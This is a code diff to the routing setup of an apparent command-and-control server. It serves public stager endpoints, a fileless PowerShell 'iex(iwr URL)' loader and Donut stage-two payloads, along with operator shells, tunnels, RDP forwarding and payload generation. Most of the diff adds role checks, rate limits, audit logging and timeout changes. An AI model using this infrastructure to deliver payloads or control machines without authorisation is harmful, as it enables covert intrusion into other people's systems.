@@ -25,6 +25,7 @@ import (
 	"cupcake-server/pkg/middleware"
 	"cupcake-server/pkg/model"
 	"cupcake-server/pkg/paths"
+	"cupcake-server/pkg/stagerguard"
 	"cupcake-server/pkg/store"
 	"cupcake-server/pkg/utils"
 	"cupcake-server/services"
@@ -42,6 +43,8 @@ func main() {
 		_ = os.Setenv("CUPCAKE_DATA_DIR", cfg.DataDir)
 	}
 	paths.Init()
+	// Init L2 module catalog early: scan storage/modules and auto-sign missing *.trust.json.
+	_ = services.GetModuleService()
 
 	store.InitDB()
 	// Wire seed: env CUPCAKE_WIRE_SEED overrides; else setting; else default (matches Client build.rs)
@@ -104,84 +107,105 @@ func main() {
 		c.Next()
 	})
 
+	// Health probes (no auth): process liveness + DB readiness. Registered before
+	// AuthMiddleware; non-/api paths and /api/healthz|/api/readyz are also auth-exempt.
+	adminRouter.GET("/healthz", controllers.HandleHealthz)
+	adminRouter.GET("/readyz", controllers.HandleReadyz)
+	adminRouter.GET("/api/healthz", controllers.HandleHealthz)
+	adminRouter.GET("/api/readyz", controllers.HandleReadyz)
+
 	adminRouter.Use(middleware.AuthMiddleware())
 
-	// 🚀 Public routes (no auth required) - Stager payload delivery
-	adminRouter.GET("/api/s/bin/:id", controllers.HandleServeRawPayload)
-	adminRouter.GET("/api/s/:id", controllers.HandleServePayload)
+	// Public stager delivery (auth-exempt via AuthMiddleware; rate-limited + hit-capped)
+	stagerPublic := stagerguard.RateLimitMiddleware()
+	adminRouter.GET("/api/s/bin/:id", stagerPublic, controllers.HandleServeRawPayload)
+	adminRouter.GET("/api/s/:id", stagerPublic, controllers.HandleServePayload)
 	// Fileless loader script — short one-click PS via iex(iwr URL); returns Stage2 loader body
-	adminRouter.GET("/api/s/l/:id", controllers.HandleServeFilelessLoader)
+	adminRouter.GET("/api/s/l/:id", stagerPublic, controllers.HandleServeFilelessLoader)
 	// Fileless Stage2 PIC (Donut) — short-TTL cache from /api/stager?delivery=fileless
-	adminRouter.GET("/api/stage2/:id", controllers.HandleServeStage2)
-	adminRouter.GET("/api/s/stage2/:id", controllers.HandleServeStage2)
+	adminRouter.GET("/api/stage2/:id", stagerPublic, controllers.HandleServeStage2)
+	adminRouter.GET("/api/s/stage2/:id", stagerPublic, controllers.HandleServeStage2)
 
 	api := adminRouter.Group("/api")
 	{
+		// --- viewer (any authenticated principal) ---
 		api.GET("/dashboard", controllers.GetDashboard)
 		api.GET("/clients", controllers.GetClients)
 		api.GET("/clients/history/:uuid", controllers.HandleGetAgentHistory)
-		api.DELETE("/clients/:uuid", controllers.DeleteClient)
-		api.POST("/clients/migrate", controllers.MigrateClient)
-		api.POST("/cmd", controllers.SendCommand)
 		api.GET("/resp", controllers.GetResponse)
-
 		api.GET("/listeners", controllers.ListListeners)
+		api.GET("/tunnel", controllers.ListTunnels)
+		api.GET("/socks", controllers.ListSocks)
+
+		// --- admin: client lifecycle ---
+		api.DELETE("/clients/:uuid", middleware.RequireAdmin(), controllers.DeleteClient)
+		api.POST("/clients/migrate", middleware.RequireAdmin(), controllers.MigrateClient)
+
+		// --- operator: interactive command ---
+		api.POST("/cmd", middleware.RequireOperator(), controllers.SendCommand)
+
 		// Listener lifecycle is admin-only (keys / bind ports)
 		api.POST("/listeners", middleware.RequireAdmin(), controllers.CreateListener)
 		api.POST("/listeners/:id/stop", middleware.RequireAdmin(), controllers.StopListener)
 		api.POST("/listeners/:id/start", middleware.RequireAdmin(), controllers.StartListener)
 		api.DELETE("/listeners/:id", middleware.RequireAdmin(), controllers.DeleteListener)
 
-		api.POST("/tunnel/start", controllers.StartTunnel)
-		api.POST("/tunnel/stop", controllers.StopTunnel)
-		api.POST("/tunnel/delete", controllers.DeleteTunnelController)
-		api.GET("/tunnel", controllers.ListTunnels)
+		// --- operator: tunnel / socks mutate ---
+		api.POST("/tunnel/start", middleware.RequireOperator(), controllers.StartTunnel)
+		api.POST("/tunnel/stop", middleware.RequireOperator(), controllers.StopTunnel)
+		api.POST("/tunnel/delete", middleware.RequireOperator(), controllers.DeleteTunnelController)
 
-		api.POST("/socks/start", controllers.StartSocks)
-		api.POST("/socks/stop", controllers.StopSocks)
-		api.POST("/socks/delete", controllers.DeleteTunnelController)
-		api.GET("/socks", controllers.ListSocks)
+		api.POST("/socks/start", middleware.RequireOperator(), controllers.StartSocks)
+		api.POST("/socks/stop", middleware.RequireOperator(), controllers.StopSocks)
+		api.POST("/socks/delete", middleware.RequireOperator(), controllers.DeleteTunnelController)
 
 		files := api.Group("/files")
 		{
+			// viewer: list/read/download
 			files.GET("/list", controllers.ListFilesController)
 			files.GET("/read", controllers.ReadFileController)
-			files.POST("/delete", controllers.DeleteFilesController)
-			files.POST("/upload", controllers.Upload)
 			files.GET("/download", controllers.HandleFsDownload)
+			// operator: upload/delete
+			files.POST("/delete", middleware.RequireOperator(), controllers.DeleteFilesController)
+			files.POST("/upload", middleware.RequireOperator(), controllers.Upload)
 		}
 
 		processes := api.Group("/processes")
 		{
 			processes.GET("/list", controllers.ListProcesses)
-			processes.POST("/kill", controllers.KillProcess)
+			processes.POST("/kill", middleware.RequireOperator(), controllers.KillProcess)
 		}
 
-		api.GET("/shell/:uuid", controllers.HandleAdminShell)
-		api.GET("/pty/:uuid", controllers.StreamPTY)
+		// --- operator: interactive shells / desktop control ---
+		api.GET("/shell/:uuid", middleware.RequireOperator(), controllers.HandleAdminShell)
+		api.GET("/pty/:uuid", middleware.RequireOperator(), controllers.StreamPTY)
 		// Remote desktop = RDP port-forward (agent → target:3389 via SOCKS yamux)
 		api.GET("/desktop/:uuid/status", controllers.DesktopStatus)
-		api.POST("/desktop/:uuid/start", controllers.StartDesktopRDP)
-		api.POST("/desktop/:uuid/stop", controllers.StopDesktopRDP)
+		api.POST("/desktop/:uuid/start", middleware.RequireOperator(), controllers.StartDesktopRDP)
+		api.POST("/desktop/:uuid/stop", middleware.RequireOperator(), controllers.StopDesktopRDP)
 
 		plugins := api.Group("/plugins")
 		{
 			plugins.GET("", controllers.HandleListPlugins)
+			plugins.GET("/result/:task_id", controllers.HandleGetPluginResult)
+			// admin: plugin management / execution plane
 			plugins.POST("/run", middleware.RequireAdmin(), controllers.HandleRunPlugin)
 			plugins.POST("/upload", middleware.RequireAdmin(), controllers.HandleUploadPlugin)
 			plugins.DELETE("/:id", middleware.RequireAdmin(), controllers.HandleDeletePlugin)
-			plugins.GET("/result/:task_id", controllers.HandleGetPluginResult)
 		}
 
 		// L2 product modules: desktop | iso_host | inject
 		modules := api.Group("/modules")
 		{
+			// viewer: list + pack download
 			modules.GET("", controllers.HandleListModules)
-			modules.POST("/upload", controllers.HandleUploadModule)
-			modules.DELETE("/:id", middleware.RequireAdmin(), controllers.HandleDeleteModule)
-			modules.POST("/push", controllers.HandlePushModule)
-			modules.POST("/query", controllers.HandleQueryAgentModules)
 			modules.GET("/pack/:id", controllers.HandlePackModule)
+			// operator: query agent module state
+			modules.POST("/query", middleware.RequireOperator(), controllers.HandleQueryAgentModules)
+			// admin: upload / push / delete modules
+			modules.POST("/upload", middleware.RequireAdmin(), controllers.HandleUploadModule)
+			modules.POST("/push", middleware.RequireAdmin(), controllers.HandlePushModule)
+			modules.DELETE("/:id", middleware.RequireAdmin(), controllers.HandleDeleteModule)
 		}
 
 		api.GET("/build/logs/:task_id", controllers.HandleBuildLogsWS)
@@ -194,6 +218,9 @@ func main() {
 			transfer.Static("/static", paths.Join("public_tools"))
 		}
 
+		// Light observability (admin-only; not public scrape)
+		api.GET("/metrics", middleware.RequireAdmin(), controllers.HandleMetrics)
+
 		settings := api.Group("/settings")
 		{
 			settings.Use(middleware.RequireAdmin())
@@ -202,6 +229,8 @@ func main() {
 			settings.PUT("/users/:id", controllers.HandleUpdateUser)
 			settings.DELETE("/users/:id", controllers.HandleDeleteUser)
 			settings.GET("/logs/login", controllers.HandleGetLoginLogs)
+			settings.GET("/logs/audit", controllers.HandleGetAuditLogs)
+			settings.GET("/audit", controllers.HandleGetAuditLogs) // alias
 			settings.GET("/config", controllers.HandleGetSettings)
 			settings.POST("/config", controllers.HandleUpdateSettings)
 			settings.GET("/webhooks", controllers.HandleGetWebhooks)
@@ -212,7 +241,7 @@ func main() {
 			settings.POST("/mcp/rotate-token", controllers.HandleRotateMCPToken)
 		}
 
-		api.POST("/agents/connect", controllers.HandleConnectBindAgent)
+		api.POST("/agents/connect", middleware.RequireAdmin(), controllers.HandleConnectBindAgent)
 		// Payload generation / stager — admin (template rebuild, host keys)
 		api.POST("/generate", middleware.RequireAdmin(), controllers.HandleGenerate)
 		api.GET("/generate/stream", middleware.RequireAdmin(), controllers.HandleGenerateStream)
@@ -221,9 +250,12 @@ func main() {
 		// 保护下载：不再致录暴露，改为通过控制器注入 AuthMiddleware 展中提供文件
 		api.GET("/payloads/:filename", controllers.HandleServeProtectedPayload)
 
+		// auth logout/password: any authenticated (AuthMiddleware); login is public
 		api.POST("/auth/login", controllers.HandleLogin)
 		api.POST("/auth/logout", controllers.HandleLogout)
 		api.PUT("/auth/password", controllers.HandleChangeMyPassword)
+		// Short-lived WS upgrade tickets (pty/shell/build_logs); session auth required
+		api.POST("/auth/ws-ticket", controllers.HandleMintWSTicket)
 		api.POST("/maintenance/reset", middleware.RequireAdmin(), controllers.HandleMaintenanceReset)
 		api.GET("/maintenance/export", middleware.RequireAdmin(), controllers.HandleMaintenanceExport)
 		api.POST("/maintenance/update_templates", middleware.RequireAdmin(), controllers.HandleUpdateTemplates)
@@ -375,16 +407,21 @@ func main() {
 // Priority: config.AdminPass → existing DB hash → generate random (printed once).
 // Set CUPCAKE_FORCE_DEV_PASS=1 to force admin/cupcake123 for lab only.
 // newAdminHTTPServer applies production timeouts / header caps for the admin panel.
-// ReadHeaderTimeout and IdleTimeout limit slowloris; Read/Write bound request body lifetime.
+//
+// ReadHeaderTimeout + IdleTimeout mitigate slowloris.
+// ReadTimeout/WriteTimeout are deliberately 0: large file upload streams body while
+// each chunk waits on the agent (can take many minutes). A 60s ReadTimeout was
+// aborting mid-upload → browser axios "Network Error" around ~90% progress.
 func newAdminHTTPServer(addr string, handler http.Handler) *http.Server {
 	return &http.Server{
 		Addr:              addr,
 		Handler:           handler,
-		ReadHeaderTimeout: 10 * time.Second,
-		ReadTimeout:       60 * time.Second,
-		WriteTimeout:      300 * time.Second,
-		IdleTimeout:       120 * time.Second,
-		MaxHeaderBytes:    1 << 20, // 1 MiB
+		ReadHeaderTimeout: 15 * time.Second,
+		// 0 = no whole-request read/write deadline (required for /api/files/upload).
+		ReadTimeout:    0,
+		WriteTimeout:   0,
+		IdleTimeout:    180 * time.Second,
+		MaxHeaderBytes: 1 << 20, // 1 MiB
 	}
 }
 
